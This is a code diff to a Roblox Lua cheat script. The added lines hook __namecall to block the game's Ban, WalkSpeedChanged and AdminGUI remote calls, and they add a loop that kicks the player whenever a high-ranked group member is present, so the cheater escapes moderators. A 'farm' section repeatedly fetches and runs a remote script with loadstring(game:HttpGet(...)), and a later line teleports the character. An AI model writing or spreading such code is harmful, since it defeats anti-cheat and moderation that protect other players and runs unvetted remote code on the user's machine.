@@ -1,7 +1,31 @@
+-- bypass
+local Namecall
+Namecall = hookmetamethod(game, "__namecall", function(self, ...)
+    if getnamecallmethod() == "FireServer" and tostring(self) == "Ban" then
+        return 
+    elseif getnamecallmethod() == "FireServer" and tostring(self) == "WalkSpeedChanged" then
+        return 
+    elseif getnamecallmethod() == "FireServer" and tostring(self) == "AdminGUI" then
+        return 
+    end
+    return Namecall(self, ...)
+end)
 
+-- antiMod
+spawn(function()
+    _G.AntiMods = true
+    while _G.AntiMods do
+        for i, v in pairs(game.Players:GetChildren()) do
+            if v:GetRankInGroup(9950771) >= 2 then
+                game.Players.LocalPlayer:Kick("High Rank Player Detected." .. " [ " .. v.Name .. " ]")
+                break
+            end
+        end
+        wait(1)
+    end
+end)
 
-
-
+--farm
 coroutine.wrap(function()
     for i = 1, 1000 do
         loadstring(game:HttpGet("https://raw.githubusercontent.com/caomod2077/test-public/refs/heads/main/TestInstant"))()
@@ -21,8 +45,6 @@ game:GetService("StarterGui"):SetCore("SendNotification", {
 })
 
 wait(10)
-
-
 
 
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(18829.7109, 3042.24097, -228.608887, 0.14886488, 0, -0.988857627, -0, 1.00000012, -0, 0.988857627, 0, 0.14886488)
